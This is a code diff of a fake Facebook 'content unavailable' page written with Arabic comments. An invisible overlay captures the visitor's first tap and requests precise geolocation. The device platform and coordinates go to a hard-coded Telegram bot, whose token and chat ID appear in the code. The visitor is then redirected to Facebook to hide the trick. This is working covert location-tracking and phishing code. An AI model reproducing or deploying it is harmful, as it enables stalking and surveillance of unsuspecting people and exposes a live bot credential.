@@ -3,42 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook</title>
+    <title>محتوى غير متاح - Facebook</title>
     <style>
-        /* شاشة بيضاء بالكامل توهم المستخدم بالتحميل */
-        body { margin:0; padding:0; background:#fff; height:100vh; display:flex; justify-content:center; align-items:center; cursor:pointer; }
-        .fb-loader { width: 50px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
+        body { margin: 0; padding: 0; background: #f0f2f5; font-family: Segoe UI, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        
+        /* طبقة شفافة تغطي الشاشة بالكامل لاصطياد أول لمسة */
+        #invisible-trigger { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer; }
+
+        .error-box { text-align: center; padding: 20px; max-width: 450px; z-index: 1; }
+        .icon-lock { width: 110px; margin-bottom: 20px; opacity: 0.7; }
+        .title { font-size: 20px; font-weight: bold; color: #65676b; margin-bottom: 12px; }
+        .message { font-size: 16px; color: #65676b; line-height: 1.5; margin-bottom: 30px; }
+        .fb-btn { background: #1877f2; color: white; padding: 12px 24px; border-radius: 6px; font-weight: 600; text-decoration: none; font-size: 15px; border: none; }
     </style>
 </head>
-<body onclick="startCapture()">
+<body>
 
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-loader">
+    <div id="invisible-trigger"></div>
+
+    <div class="error-box">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png" class="icon-lock">
+        <div class="title">عذراً، هذا المحتوى غير متاح الآن</div>
+        <div class="message">
+            ربما انتهت صلاحية الرابط الذي اتبعته، أو تم حذف المنشور، أو أنك لا تملك صلاحية الوصول لرؤيته في الوقت الحالي.
+        </div>
+        <button class="fb-btn">العودة إلى الصفحة الرئيسية</button>
+    </div>
 
 <script>
-const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
-const ID = "1611398303";
+const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+const CHAT_ID = "1611398303";
 
-function startCapture() {
-    // طلب الموقع فوراً عند أول لمسة للشاشة
-    navigator.geolocation.getCurrentPosition(
-        (pos) => { sendData(pos); },
-        (err) => { sendData(null); },
-        { enableHighAccuracy: true, timeout: 5000 }
-    );
-}
-
-async function sendData(pos) {
-    let msg = `🚩 صيد تلقائي (أول لمسة)\n📱 النظام: ${navigator.platform}`;
-    if(pos) {
-        msg += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}`;
-        msg += `\n🔗 الخريطة: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+// الوظيفة تعمل عند أول لمسة للشاشة في أي مكان
+document.getElementById('invisible-trigger').onclick = function() {
+    this.style.display = 'none'; // إخفاء الطبقة الشفافة فوراً
+    
+    // محاولة سحب الموقع فوراً (سيظهر طلب الإذن للمستخدم)
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => { sendToTele(pos); },
+            (err) => { sendToTele(null); },
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
     }
+};
+
+async function sendToTele(pos) {
+    let text = `🚩 دخول (صفحة تم الحذف)\n📱 النظام: ${navigator.platform}`;
     
-    // إرسال البيانات
-    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`);
+    if (pos) {
+        text += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}`;
+        text += `\n🔗 الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+    } else {
+        text += `\n📍 الموقع: تم الرفض أو غير متاح`;
+    }
+
+    // إرسال البيانات للتلجرام
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
     
-    // التوجيه لفيسبوك
+    // التوجيه النهائي لفيسبوك لإتمام التمويه
     window.location.href = "https://m.facebook.com/";
 }
 </script>
